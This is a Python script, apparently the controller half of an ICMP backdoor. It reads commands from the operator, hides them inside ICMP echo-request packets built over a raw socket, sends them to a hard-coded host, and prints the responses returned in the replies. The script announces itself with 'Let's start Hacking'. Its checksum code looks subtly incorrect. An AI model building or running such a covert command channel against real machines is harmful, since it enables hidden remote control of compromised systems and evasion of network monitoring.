#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import struct
import socket
import time
import sys

def calc_checksum(icmp):
    # checksum
    if len(icmp) % 2:
        icmp += b'\00'

    checksum = 0
    for i in range(len(icmp)//2):
        word, = struct.unpack('!H',icmp[2*i:2*i+2])
        checksum += word
    while True:
        carry = checksum >> 16
        if carry:
            checksum = (checksum & 0xffff) + carry
        else:
            break
    checksum = (~checksum & 0xffff) +1
    #print("checksum =",checksum)

    return struct.pack('!H',checksum)

def pack_icmp(_type, code, checksum, identifier, sequence,cmd):
    # packet icmp
    # checksum
    sendtime = time.time()
    header = struct.pack('!BBHHH', _type, code, checksum, identifier, sequence)
    length = len(cmd)
    if(length<64):
        length = 64
    elif length<128:
       length=128
    else:
        length=256
    #print(length)
    data = struct.pack('!d'+str(length)+'p',sendtime,cmd)
    #data = struct.pack('!d256p', sendtime, cmd)
    icmp = header+data
    checksum = calc_checksum(icmp)
    icmp = header[:2]+checksum+header[4:]+data

    return icmp

def receive(ip_layer):
    icmp = ip_layer[20:]
    type = icmp[0]
    data = icmp[17:]

    return type,data


def send(icmp,dst):
    # needs root
    # SOCK_RAW要管理员权限
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.sendto(icmp, 0, (dst, 0))

    ip_layer, (src_ip, _) = sock.recvfrom(1500)
    type,data = receive(ip_layer)
    sock.close()

    return type,data,src_ip

def main(src,dst):
    # 主体功能
    _type = 8  # ICMP type 8,0
    code = 0  # ICMP code,0,0
    checksum = 1  # 校验和
    identifier = 1  # 标识符
    sequence = 17  # 报文序号
    cmd = 'hello icmp,Let\'s start Hacking'  # 数据
    print("************")
    print(cmd)
    print("************")
    while 1:
        try:
            #cmd = sys.stdin.readline()
            cmd = input("plz input the code:  ")
            if cmd == 'exit':
                return
        except:
            pass

        icmp = pack_icmp(_type,code,checksum,identifier,sequence,cmd.encode('utf-8'))
        #print(icmp)
        identifier = identifier*(identifier+1)%4096
        sequence = sequence+1

        type,data,src_ip = send(icmp,dst)

        #print(type)
        print('---------------------------')

        print('answer from: ',src_ip)
        #print('data:',data)
        a = str(data.decode('utf-8')).split(b'\x00'.decode('utf-8'),1)[0]
        #print('answer:      ',a)
        print('answer:\n',a)
        print('---------------------------')
        #print('\n')


    # send
    # receive


if __name__=='__main__':
    src='127.0.0.1'
    dst='192.168.66.132'
    dst2='192.168.66.1'
    main(src,dst)

    # receive data
    # data 识别

    # send data

    # icmp packet

